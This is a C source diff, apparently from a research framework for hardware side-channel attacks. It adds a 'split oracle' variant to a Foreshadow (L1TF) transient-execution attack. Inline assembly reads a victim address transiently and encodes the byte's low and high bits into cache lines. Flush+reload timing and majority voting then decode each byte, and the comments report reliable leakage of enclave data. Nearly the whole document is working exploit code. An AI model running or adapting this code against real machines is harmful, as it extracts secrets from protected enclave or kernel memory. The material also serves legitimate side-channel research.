 int  __attribute__((aligned(0x1000))) fs_dummy;
 char __attribute__((aligned(0x1000))) fs_oracle[ORACLE_SIZE];
 
+/*
+ * -------------------------------------------------------------------------
+ * Split lo/hi oracle (FS_SPLIT_ORACLE=1).
+ *
+ * The default oracle above places all 256 slots at a 0x1000 stride, which on an
+ * L1D whose set index is (addr>>6)&(nsets-1) puts every slot in ONE set. Where
+ * flush+reload is set-scoped (measured on the i3-6100 lab host), that oracle
+ * cannot be decoded by a purely transient read: the reload scan of slots
+ * 0..secret-1 evicts slot[secret] before it is timed, so only small byte values
+ * survive and the enclave attack tops out near 10%.
+ *
+ * The split oracle gives every candidate CLASS its own L1D set (0x1040 stride)
+ * and decodes the byte as two independent traces -- the low six bits and the
+ * high two bits -- one candidate at a time (flush slot, one transient, reload
+ * slot). This is the geometry validated at 0/64 by app/foreshadow-leak.
+ *
+ * It requires the application's #PF handler to NOT re-present the page but to
+ * redirect RIP to fs_split_skip_to (set by the block below), so nothing is
+ * re-executed architecturally -- on a real enclave that would read the 0xff
+ * abort page. app/foreshadow's handler does this when fs_split is set.
+ * -------------------------------------------------------------------------
+ */
+#define FS_SPLIT_SLOT   0x1040
+#define FS_LO_CLASSES   64
+#define FS_HI_CLASSES   4
+
+int fs_split = 0;
+int fs_split_repeat = 5;         /* FS_SPLIT_REPEAT: majority vote per byte */
+void * volatile fs_split_skip_to = NULL;
+char __attribute__((aligned(0x1000))) fs_oracle_lo[FS_SPLIT_SLOT * FS_LO_CLASSES];
+char __attribute__((aligned(0x1000))) fs_oracle_hi[FS_SPLIT_SLOT * FS_HI_CLASSES];
+
+static inline void fs_leak_lo(void *base, void *adrs)
+{
+    asm volatile(
+        "   lea 2f(%%rip), %%rax\n\t"
+        "   mov %%rax, %0\n\t"
+        "1: movb (%1), %%al\n\t"
+        "   movzbl %%al, %%eax\n\t"
+        "   and $0x3f, %%eax\n\t"
+        "   imul %3, %%rax\n\t"
+        "   movq (%2, %%rax), %%rdi\n\t"
+        "2:\n\t"
+        : "=m"(fs_split_skip_to)
+        : "r"(adrs), "r"(base), "r"((unsigned long) FS_SPLIT_SLOT)
+        : "rax", "rdi", "memory");
+}
+
+static inline void fs_leak_hi(void *base, void *adrs)
+{
+    asm volatile(
+        "   lea 2f(%%rip), %%rax\n\t"
+        "   mov %%rax, %0\n\t"
+        "1: movb (%1), %%al\n\t"
+        "   movzbl %%al, %%eax\n\t"
+        "   shr $6, %%eax\n\t"
+        "   imul %3, %%rax\n\t"
+        "   movq (%2, %%rax), %%rdi\n\t"
+        "2:\n\t"
+        : "=m"(fs_split_skip_to)
+        : "r"(adrs), "r"(base), "r"((unsigned long) FS_SPLIT_SLOT)
+        : "rax", "rdi", "memory");
+}
+
+/* Decode one trace: warm the victim line, then for each candidate class flush
+ * its slot, run one transient, and time the slot. Returns the argmin class. */
+static int fs_decode_split(void *base, int classes, int high, void *adrs)
+{
+    int c, best = -1;
+    unsigned long t, b = ~0UL;
+
+    for (c = 0; c < classes; c++)
+    {
+        void *slot = (void *)((uint8_t *) base + (uint64_t) c * FS_SPLIT_SLOT);
+
+        if (fs_keep_warm_cb)
+            fs_keep_warm_cb();
+        flush(slot);
+        if (!fs_skip_transient)
+        {
+            if (high) fs_leak_hi(base, adrs);
+            else      fs_leak_lo(base, adrs);
+        }
+        t = reload(slot);
+        if (t < b) { b = t; best = c; }
+    }
+    return best;
+}
+
+static int foreshadow_round_split(void *adrs)
+{
+    int votes[256] = {0}, r, best = 0;
+
+    /*
+     * Repeat the (lo,hi) measurement and take the majority. A correct read is
+     * stable; the occasional wrong one (the victim line was evicted by the
+     * per-candidate re-warm's own overhead before the transient, so it leaked
+     * 0x00) is random, so the mode is the true byte -- the paper's repeated
+     * measurement, which lifts a ~99% single-shot read to a reliable 64/64.
+     */
+    for (r = 0; r < fs_split_repeat; r++)
+    {
+        int lo = fs_decode_split(fs_oracle_lo, FS_LO_CLASSES, 0, adrs);
+        int hi = fs_decode_split(fs_oracle_hi, FS_HI_CLASSES, 1, adrs);
+        int b = (lo < 0 || hi < 0) ? 0 : (((hi & 0x3) << 6) | (lo & 0x3f));
+        votes[b & 0xff]++;
+    }
+    for (r = 0; r < 256; r++)
+        if (votes[r] > votes[best]) best = r;
+    return best;
+}
